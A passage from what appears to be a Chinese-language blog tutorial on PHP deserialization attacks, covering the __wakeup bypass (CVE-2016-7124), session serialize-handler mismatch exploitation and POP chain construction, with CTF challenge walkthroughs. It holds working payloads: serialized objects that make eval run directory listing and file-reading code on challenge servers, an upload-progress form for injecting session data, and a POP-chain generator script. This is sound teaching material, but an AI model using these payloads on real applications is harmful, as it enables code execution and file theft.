class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></p><p>payload:<code>http://120.79.33.253:9001/?str=s:7:%22D0g3!!!%22</code></p><h2 id="0x02-反序列化对象注入"><a href="#0x02-反序列化对象注入" class="headerlink" title="0x02 反序列化对象注入"></a>0x02 反序列化对象注入</h2><h3 id="绕过-wakeup-方法"><a href="#绕过-wakeup-方法" class="headerlink" title="绕过__wakeup()方法"></a>绕过__wakeup()方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">  <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</span><br><span class="line">        show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="title">return</span> '' </span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;     </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123; </span><br><span class="line">  show_source(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">  $file=base64_decode($_GET[<span class="string">'file'</span>]); </span><br><span class="line">  <span class="keyword">echo</span> unserialize($file); </span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span> <span class="comment">#&lt;!--key in flag.php--&gt;</span></span><br></pre></td></tr></table></figure><p>分析一下源码，<code>__destruct</code>方法中<code>show_source(dirname (__FILE__).&#39;/&#39;.$this -&gt;file);</code>会读取file文件内容，我们需要利用这里来读flag.php，思路大概就是构造序列化对象然后base64编码传入，经过unserialize将file设为flag.php，但是<code>__wakeup</code>会在unserialize之前执行，所以要绕过这一点。</p><p>这里就要用到CVE-2016-7124漏洞，<strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p><p>构造序列化对象：O:5:”SoFun”:<font color="red">1</font>:{S:7:”\00<em>\00file”;s:8:”flag.php”;}<br><strong>绕过__wakeup</strong>：O:5:”SoFun”:<font color="red">2</font>:{S:7:”\00</em>\00file”;s:8:”flag.php”;}</p><p>注意：因为file是protect属性，所以需要加上\00*\00。再base64编码。<br>payload：Tzo1OiJTb0Z1biI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ==</p><p>这里可以自己写一个相对简单的例子来加以理解<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Twosmil1e</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $key = <span class="string">'twosmi1e'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;key))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key == <span class="string">'twosmi1e'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;key = <span class="string">'you failed 23333'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'answer'</span>]))&#123;</span><br><span class="line">show_source(<span class="string">'serializetest.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$answer = $_GET[<span class="string">'answer'</span>];</span><br><span class="line"><span class="keyword">echo</span> $answer;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> unserialize($answer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们首先构造序列化正常序列化对象：<code>O:9:&quot;Twosmil1e&quot;:1:{s:3:&quot;key&quot;;s:8:&quot;twosmi1e&quot;;}</code><br><img src="/2018/12/20/PHP反序列化/1545226643834.png" alt="Alt text"><br>发现<code>__wakeup()</code>会先执行，<code>__destruct()</code>中的判断不成立，无法输出success，尝试将对象属性个数1改为任意大于1的数，即可绕过<code>__wakeup()</code><br><img src="/2018/12/20/PHP反序列化/1545226823345.png" alt="Alt text"></p><h2 id="0x03-session反序列化漏洞"><a href="#0x03-session反序列化漏洞" class="headerlink" title="0x03 session反序列化漏洞"></a>0x03 session反序列化漏洞</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>首先我们需要了解session反序列化是什么？<br>PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化<br>在php.ini中有以下配置项，wamp的默认配置如图<br><img src="/2018/12/20/PHP反序列化/1545235002297.png" alt="Alt text"><br><img src="/2018/12/20/PHP反序列化/1545234989274.png" alt="Alt text"><br><code>session.save_path</code> 设置session的存储路径<br><code>session.save_handler</code> 设定用户自定义存储函数<br><code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话<br><code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php<br>除了默认的session序列化引擎php外，还有几种引擎，不同引擎存储方式不同</p><table><thead><tr><th style="text-align:center">存储引擎</th><th style="text-align:center">存储格式</th></tr></thead><tbody><tr><td style="text-align:center">php_binary</td><td style="text-align:center">键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值</td></tr><tr><td style="text-align:center">php</td><td style="text-align:center">键名＋竖线＋经过serialize()函数反序列处理的值</td></tr><tr><td style="text-align:center">php_serialize</td><td style="text-align:center">serialize()函数反序列处理数组方式</td></tr></tbody></table><h3 id="存储机制"><a href="#存储机制" class="headerlink" title="存储机制"></a>存储机制</h3><p>php中的session内容是以<strong>文件</strong>方式来存储的，由<code>session.save_handler</code>来决定。文件名由<code>sess_sessionid</code>命名，文件内容则为session序列化后的值。<br>来测试一个demo<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[&apos;name&apos;] = &apos;twosmi1e&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>运行后在配置文件设定的路径中会生成一个session文件<br><img src="/2018/12/20/PHP反序列化/1545236350464.png" alt="Alt text"><br>存储引擎为php时<br><img src="/2018/12/20/PHP反序列化/1545236700999.png" alt="Alt text"><br>存储引擎为php_binary时结果为<br><img src="/2018/12/20/PHP反序列化/1545236642027.png" alt="Alt text"></p><p>三种处理器的存储格式差异，就会造成在session序列化和反序列化处理器设置不当时的安全隐患。</p><h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p>直接上例子吧 </p><h4 id="Jarvisoj-Web"><a href="#Jarvisoj-Web" class="headerlink" title="Jarvisoj Web"></a>Jarvisoj Web</h4><blockquote><p>题目地址：<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="external">http://web.jarvisoj.com:32784/index.php</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//A webshell is wait for you</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;phpinfo&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&apos;sessiontest.php&apos;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p></blockquote><p> 先来看一看phpinfo里的内容 php版本：5.6.21<br> <strong>php大于5.5.4的版本中默认使用php_serialize规则</strong><br> <img src="/2018/12/20/PHP反序列化/1545273945027.png" alt="Alt text"><br>默认为php_serialize而index.php中又使用了php，反序列化和序列化使用的处理器不同，由于格式的原因会导致数据无法正确反序列化，那么就可以通过构造伪造任意数据。<br><img src="/2018/12/20/PHP反序列化/1545274357328.png" alt="Alt text"></p><blockquote><p>PHP手册<br>Session 上传进度<br>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态<br>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在\$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。</p></blockquote><p>了解了之后，就可以通过POST方法来构造数据传入<code>$_SESSION</code><br>构造POST提交表单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><p>构造序列化字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz=&apos;print_r(dirname(__FILE__));&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new OowoO();</span><br><span class="line">$a = serialize($obj);</span><br><span class="line"> </span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure></p><p>注意需要转义，抓包吧filename改为payload<br>最终提交为：<code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:27:\&quot;print_r(dirname(__FILE__));\&quot;;}</code><br><img src="/2018/12/20/PHP反序列化/1545276025699.png" alt="Alt text"><br>目录/opt/lampp/htdocs<br><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}</code>继续读<br><img src="/2018/12/20/PHP反序列化/1545276188010.png" alt="Alt text"><br>然后用<code>file_get_contents</code>函数读flag<br><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}</code><br><img src="/2018/12/20/PHP反序列化/1545276523785.png" alt="Alt text"></p><h4 id="安洵杯Double-S"><a href="#安洵杯Double-S" class="headerlink" title="安洵杯Double-S"></a>安洵杯Double-S</h4><p>也是类似的一道session反序列化的题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line">class Anti</span><br><span class="line">&#123;</span><br><span class="line">    public $info;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;info = &apos;phpinfo();&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;info);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;aa&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    if(unserialize($_GET[&apos;aa&apos;])==&apos;phpinfo&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">    $m = new Anti();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    header(&quot;location:index.html&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>emmmm 几乎一样 可以自己试着做一下<br><code>http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code><br>发现flag文件<a href="http://54.200.169.99:7000/f1ag_i3_h3re" target="_blank" rel="external">http://54.200.169.99:7000/f1ag_i3_h3re</a><br>D0g3{Sim_Pl3_S3sSi0n}</p><h2 id="0x04-POP链构造"><a href="#0x04-POP链构造" class="headerlink" title="0x04 POP链构造"></a>0x04 POP链构造</h2><h3 id="POP：面向属性编程"><a href="#POP：面向属性编程" class="headerlink" title="POP：面向属性编程"></a>POP：面向属性编程</h3><p>面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：<strong>进行反序列化的数据能够被用户输入所控制。</strong></p><h3 id="POP链利用"><a href="#POP链利用" class="headerlink" title="POP链利用"></a>POP链利用</h3><p>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p><h3 id="实战训练"><a href="#实战训练" class="headerlink" title="实战训练"></a>实战训练</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">            $this-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 = $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public $str2;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&apos;string&apos;];</span><br><span class="line">unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看到需要执行GetFlag类中的get_flag()函数，这是一个类的普通方法。要让这个方法执行，需要构造一个POP链。</p><ol><li><code>string1</code>中的<code>__tostring</code>存在<code>$this-&gt;str1-&gt;get_flag()</code>，分析一下要自动调用<code>__tostring()</code>需要把类<code>string1</code>当成字符串来使用，因为调用的是参数<code>str1</code>的方法，所以需要把<code>str1</code>赋值为类<code>GetFlag</code>的对象。</li><li>发现类<code>func</code>中存在<code>__invoke</code>方法执行了字符串拼接，需要把<code>func</code>当成函数使用自动调用<code>__invoke</code>然后把<code>$mod1</code>赋值为<code>string1</code>的对象与<code>$mod2</code>拼接。</li><li>在<code>funct</code>中找到了函数调用，需要把<code>mod1</code>赋值为<code>func</code>类的对象，又因为函数调用在<code>__call</code>方法中，且参数为<code>$test2</code>,即无法调用<code>test2</code>方法时自动调用 <code>__call</code>方法；</li><li>在<code>Call</code>中的<code>test1</code>方法中存在<code>$this-&gt;mod1-&gt;test2();</code>，需要把<code>$mod1</code>赋值为<code>funct</code>的对象，让<code>__call</code>自动调用。</li><li>查找<code>test1</code>方法的调用点，在<code>start_gg</code>中发现<code>$this-&gt;mod1-&gt;test1();</code>，把<code>$mod1</code>赋值为<code>start_gg</code>类的对象，等待<code>__destruct()</code>自动调用。</li></ol><p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1 = new Call();//把$mod1赋值为Call类对象</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1 = new funct();//把 $mod1赋值为funct类对象</span><br><span class="line">        &#125;</span><br><span class="line">        public function test1()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1= new func();//把 $mod1赋值为func类对象</span><br><span class="line">                 </span><br><span class="line">        &#125;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 = $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1= new string1();//把 $mod1赋值为string1类对象</span><br><span class="line">                 </span><br><span class="line">        &#125;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;        </span><br><span class="line">                $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1= new GetFlag();//把 $str1赋值为GetFlag类对象          </span><br><span class="line">        &#125;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;        </span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = new start_gg;//构造start_gg类对象$b</span><br><span class="line">echo urlencode(serialize($b)).&quot;&lt;br /&gt;&quot;;//显示输出url编码后的序列化对象</span><br></pre></td></tr></table></figure></p><p>输出payload后传参，成功执行get_flag()<br><img src="/2018/12/20/PHP反序列化/1545287095843.png" alt="Alt text"></p><p>另外推荐一下柠檬师傅博客的那道题</p><blockquote><p><a href="http://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html" target="_blank" rel="external">http://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html</a><br><a href="https://cl0und.github.io/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="external">https://cl0und.github.io/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/</a></p></blockquote><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 